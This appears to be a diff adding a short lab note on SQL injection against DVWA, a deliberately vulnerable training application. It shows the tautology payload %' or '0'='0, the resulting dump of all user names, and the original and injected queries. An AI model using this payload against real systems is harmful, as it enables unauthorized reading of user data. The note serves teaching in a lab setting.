@@ -1,0 +1,36 @@
+In DVWA set security to low and go to SQL Injection
+
+Try: 1
+
+#OUTPUT:
+	ID: 1
+	First name: admin
+	Surname: admin
+
+Then try: %' or '0'='0
+
+#OUTPUT:
+	ID: %' or '0'='0
+	First name: admin
+	Surname: admin
+
+	ID: %' or '0'='0
+	First name: Gordon
+	Surname: Brown
+
+	ID: %' or '0'='0
+	First name: Hack
+	Surname: Me
+
+	ID: %' or '0'='0
+	First name: Pablo
+	Surname: Picasso
+
+	ID: %' or '0'='0
+	First name: Bob
+	Surname: Smith
+
+This query will return all the users because % is always false (the ID is a number) and 0 is always equals to 0
+
+Original query:	SELECT first_name, last_name FROM users WHERE user_id = '%id';
+Faked query: SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
